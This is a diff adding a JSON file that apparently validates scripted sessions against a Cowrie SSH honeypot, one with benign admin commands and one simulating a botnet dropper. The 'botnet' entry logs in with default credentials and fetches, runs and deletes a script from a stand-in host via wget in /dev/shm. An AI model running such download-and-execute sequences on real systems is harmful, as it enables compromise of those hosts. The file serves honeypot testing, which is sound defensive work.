@@ -1,0 +1,92 @@
+{
+  "benign_admin": {
+    "session": "a8bece43a6c7",
+    "credentials": [
+      "ubuntu",
+      "Adm1n#2026"
+    ],
+    "termination": "clean_exit",
+    "exit_confirmed": true,
+    "commands_sent": [
+      "w",
+      "du -sh /var/log",
+      "cat /proc/meminfo",
+      "pwd",
+      "tail -n 50 /var/log/syslog"
+    ],
+    "cowrie_inputs": [
+      "w",
+      "du -sh /var/log",
+      "cat /proc/meminfo",
+      "pwd",
+      "tail -n 50 /var/log/syslog",
+      "exit"
+    ],
+    "sent_equals_recorded_in_order": true,
+    "final_event": "cowrie.session.closed",
+    "cowrie_duration_s": 11.9,
+    "waits": 6,
+    "prompt_evidence_matches_manifest": true,
+    "prompts": [
+      "ubuntu@svr04:~$ "
+    ],
+    "redacted_markers": 0,
+    "redaction_reasons": [
+      "no_secret_typed"
+    ],
+    "password_text_in_output": false,
+    "password_occurrences_outside_prompts": 0,
+    "replacement_chars": 0,
+    "invalid_utf8_bytes": 0,
+    "non_ascii_chars": [],
+    "truncated_waits": 0,
+    "wget_output": null
+  },
+  "botnet": {
+    "session": "8e394a6d867c",
+    "credentials": [
+      "admin",
+      "admin"
+    ],
+    "termination": "clean_exit",
+    "exit_confirmed": true,
+    "commands_sent": [
+      "cd /dev/shm",
+      "wget http://mirror.example/b.sh",
+      "chmod +x b.sh",
+      "./b.sh",
+      "rm -rf b.sh"
+    ],
+    "cowrie_inputs": [
+      "cd /dev/shm",
+      "wget http://mirror.example/b.sh",
+      "chmod +x b.sh",
+      "./b.sh",
+      "rm -rf b.sh",
+      "exit"
+    ],
+    "sent_equals_recorded_in_order": true,
+    "final_event": "cowrie.session.closed",
+    "cowrie_duration_s": 14.2,
+    "waits": 6,
+    "prompt_evidence_matches_manifest": true,
+    "prompts": [
+      "admin@svr04:/dev/shm$ ",
+      "admin@svr04:~$ "
+    ],
+    "redacted_markers": 0,
+    "redaction_reasons": [
+      "no_secret_typed"
+    ],
+    "password_text_in_output": true,
+    "password_occurrences_outside_prompts": 0,
+    "replacement_chars": 0,
+    "invalid_utf8_bytes": 0,
+    "non_ascii_chars": [
+      "‘",
+      "’"
+    ],
+    "truncated_waits": 0,
+    "wget_output": "wget http://mirror.example/b.sh\n--2026-11-10 11:06:45--  http://mirror.example/b.sh\nResolving mirror.example (mirror.example)... failed: Temporary failure in name resolution.\nwget: unable to resolve host address ‘mirror.example’\nadmin@svr04:/dev/shm$ "
+  }
+}
